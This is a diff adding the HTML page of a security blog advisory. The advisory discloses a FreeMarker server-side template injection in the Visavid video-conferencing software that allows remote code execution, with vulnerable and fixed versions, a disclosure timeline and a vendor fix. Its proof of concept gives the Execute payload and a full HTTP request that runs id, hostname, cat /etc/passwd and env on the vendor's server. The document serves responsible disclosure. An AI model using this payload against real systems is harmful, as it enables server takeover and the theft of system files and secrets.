@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.7.1 -->
+<title>Advisory - Visavid remote code execution via SSTI | Red vs. Blue Shell</title>
+<meta name="generator" content="Jekyll v4.2.0" />
+<meta property="og:title" content="Advisory - Visavid remote code execution via SSTI" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Product description Kommunizieren, präsentieren, fortbilden: Unsere flexible Videokonferenz-Software ist von der Entwicklung bis zum Support zu 100 % Made in Germany und bietet neben Datenschutz und einem hohen Sicherheits-Level auch individuelle Anpassungsmöglichkeiten für unterschiedliche Einsatzbereiche." />
+<meta property="og:description" content="Product description Kommunizieren, präsentieren, fortbilden: Unsere flexible Videokonferenz-Software ist von der Entwicklung bis zum Support zu 100 % Made in Germany und bietet neben Datenschutz und einem hohen Sicherheits-Level auch individuelle Anpassungsmöglichkeiten für unterschiedliche Einsatzbereiche." />
+<link rel="canonical" href="/advisory/2021/04/27/visavid-rce.html" />
+<meta property="og:url" content="/advisory/2021/04/27/visavid-rce.html" />
+<meta property="og:site_name" content="Red vs. Blue Shell" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-04-27T00:00:00+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Advisory - Visavid remote code execution via SSTI" />
+<script type="application/ld+json">
+{"description":"Product description Kommunizieren, präsentieren, fortbilden: Unsere flexible Videokonferenz-Software ist von der Entwicklung bis zum Support zu 100 % Made in Germany und bietet neben Datenschutz und einem hohen Sicherheits-Level auch individuelle Anpassungsmöglichkeiten für unterschiedliche Einsatzbereiche.","@type":"BlogPosting","headline":"Advisory - Visavid remote code execution via SSTI","dateModified":"2021-04-27T00:00:00+00:00","datePublished":"2021-04-27T00:00:00+00:00","mainEntityOfPage":{"@type":"WebPage","@id":"/advisory/2021/04/27/visavid-rce.html"},"url":"/advisory/2021/04/27/visavid-rce.html","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="/feed.xml" title="Red vs. Blue Shell" />
+</head>
+<body><header class="site-header">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">Red vs. Blue Shell</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">Advisory - Visavid remote code execution via SSTI</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2021-04-27T00:00:00+00:00" itemprop="datePublished">Apr 27, 2021
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody"><p class="advisory-details">
+
+<table>
+    <tr>
+        <th>Product:</th>
+        <th>Visavid</th>
+    </tr>
+    <tr>
+        <th>Homepage:</th>
+        <th><a href="https://visavid.de/">https://visavid.de/</a></th>
+    </tr>
+
+
+
+    
+    <tr>
+        <th>Vulnerable version:</th>
+        <th>Gateway 1.10.2, Verwaltung: 1.10.6</th>
+    </tr>
+    <tr>
+        <th>Fixed version:</th>
+        <th>Gateway 1.10.3, Verwaltung: 1.10.14</th>
+    </tr>
+    <tr>
+        <th>CVSS Score:</th>
+        <th><span class="HIGH">HIGH 8.8</span> - <a href="https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H">CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H</a>
+        </th>
+    </tr>
+    <tr>
+        <th>Found:</th><th>Apr 19, 2021</th>
+    </tr>
+</table>
+
+</p><h1 id="product-description">Product description</h1>
+<p>Kommunizieren, präsentieren, fortbilden: Unsere flexible Videokonferenz-Software ist von der Entwicklung bis zum Support zu 100 % Made in Germany und bietet neben Datenschutz und einem hohen Sicherheits-Level auch individuelle Anpassungsmöglichkeiten für unterschiedliche Einsatzbereiche.</p>
+
+<p><a href="https://auctores.de/software/produkte/">Auctores - visavid</a></p>
+
+<h1 id="vulnerability-overview">Vulnerability overview</h1>
+<p>The software <code class="language-plaintext highlighter-rouge">visavid</code> allows an <code class="language-plaintext highlighter-rouge">room</code> admin to invite other participants via E-Mail messages. After submitting the message it is processed by the <code class="language-plaintext highlighter-rouge">Java</code> templating engine <a href="https://freemarker.apache.org/">FreeMarker</a> to create a message with some dynamic data in it. There are some tags listed on the website which can be used. As the user input is not properly validated it is possible to include arbitrary tags and execute code on the server side.</p>
+
+<h1 id="proof-of-concept">Proof of concept</h1>
+<p>The endpoint <code class="language-plaintext highlighter-rouge">/api/verwaltung/rooms/subscriber/nachricht/{uuid}</code> allows an user to send an invitation E-Mail to other attendees. Both the <code class="language-plaintext highlighter-rouge">subject</code> and the <code class="language-plaintext highlighter-rouge">body</code> parameter are processed via the templating engine on the server side. This allows an attacker to execute code on the server using the payload</p>
+
+<pre><code class="language-freemarker">&lt;#assign ex=\"freemarker.template.utility.Execute\"?new()&gt;
+</code></pre>
+
+<p>The following requests executes different commands (<code class="language-plaintext highlighter-rouge">id</code>, <code class="language-plaintext highlighter-rouge">hostname</code>, <code class="language-plaintext highlighter-rouge">cat /etc/passwd</code>, <code class="language-plaintext highlighter-rouge">env</code>):</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/api/verwaltung/rooms/subscriber/nachricht/{UUID}</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">app.visavid.de</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">application/hal+json</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/json</span>
+<span class="na">Authorization</span><span class="p">:</span> <span class="s">Bearer XXX</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">521</span>
+<span class="na">Origin</span><span class="p">:</span> <span class="s">https://app.visavid.de</span>
+<span class="na">DNT</span><span class="p">:</span> <span class="s">1</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+
+<span class="p">{</span><span class="w">
+    </span><span class="nl">"signatur"</span><span class="p">:</span><span class="w"> </span><span class="s2">"&lt;p&gt;Informationen nach Art. 13 DSGVO in Bezug auf Visavid finden Sie unter &lt;a href=</span><span class="se">\"</span><span class="s2">https://visavid.de/datenschutz#Informationspflichten</span><span class="se">\"</span><span class="s2">&gt;https://visavid.de/datenschutz#Informationspflichten&lt;/a&gt;.&lt;/p&gt;"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"body"</span><span class="p">:</span><span class="w"> </span><span class="s2">"&lt;p&gt;Einladung:&lt;/p&gt;</span><span class="se">\n</span><span class="s2">&lt;p&gt;&lt;#assign ex=</span><span class="se">\"</span><span class="s2">freemarker.template.utility.Execute</span><span class="se">\"</span><span class="s2">?new()&gt; ${ ex(</span><span class="se">\"</span><span class="s2">id</span><span class="se">\"</span><span class="s2">) } </span><span class="se">\n</span><span class="s2"> ${ ex(</span><span class="se">\"</span><span class="s2">hostname</span><span class="se">\"</span><span class="s2">)} </span><span class="se">\n</span><span class="s2"> ${ ex(</span><span class="se">\"</span><span class="s2">cat /etc/passwd</span><span class="se">\"</span><span class="s2">)} </span><span class="se">\n</span><span class="s2"> ${ ex(</span><span class="se">\"</span><span class="s2">env</span><span class="se">\"</span><span class="s2">)}&lt;/p&gt;"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"subject"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Einladung"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"reply"</span><span class="p">:</span><span class="w"> </span><span class="s2">"{EMAIL}"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"absender"</span><span class="p">:</span><span class="w"> </span><span class="s2">"{NAME}"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"testaddress"</span><span class="p">:</span><span class="w"> </span><span class="s2">"test-visavid@domain.test"</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+<p>The resulting mail contains the output of the different commands:</p>
+
+<p><img src="/assets/visavid/210419-rce-email.png" alt="RCE result" /></p>
+
+<h1 id="timeline">Timeline</h1>
+<ul>
+  <li>2021-04-19: Vendor contacted via security@, asked for a PGP Key / SMIME certificate to encrypt communication</li>
+  <li>2021-04-20: Response from vendor</li>
+  <li>2021-04-20: Report sent</li>
+  <li>2021-04-20: Vendor informed that a temporary hotfix has been applied</li>
+  <li>2021-04-26: Vendor informed that the issue is fixed</li>
+  <li>2021-04-27: Public release of security advisory</li>
+</ul>
+
+<h1 id="resources">Resources</h1>
+<ul>
+  <li><a href="https://portswigger.net/research/server-side-template-injection">PortSwigger Research - SSTI</a></li>
+  <li><a href="https://portswigger.net/web-security/server-side-template-injection">PortSwigger WebSecurity - SSTI</a></li>
+  <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection">PayloadAllTheThing - SSTI</a></li>
+</ul>
+
+  </div>
+
+  <a class="u-url" href="/advisory/2021/04/27/visavid-rce.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col">
+        <p class="feed-subscribe">
+          <a href="/feed.xml">
+            <svg class="svg-icon orange">
+              <use xlink:href="/assets/minima-social-icons.svg#rss"></use>
+            </svg><span>Subscribe</span>
+          </a>
+        </p>
+      </div>
+      <div class="footer-col">
+        <p>Posts about IT Security, pentesting and bug bounty hunting.</p>
+      </div>
+    </div>
+
+    <div class="social-links"><ul class="social-media-list"><li>
+  <a rel="me" href="https://github.com/stuxxn" target="_blank" title="github">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#github"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://twitter.com/stuxxn" target="_blank" title="twitter">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#twitter"></use>
+    </svg>
+  </a>
+</li>
+</ul>
+</div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
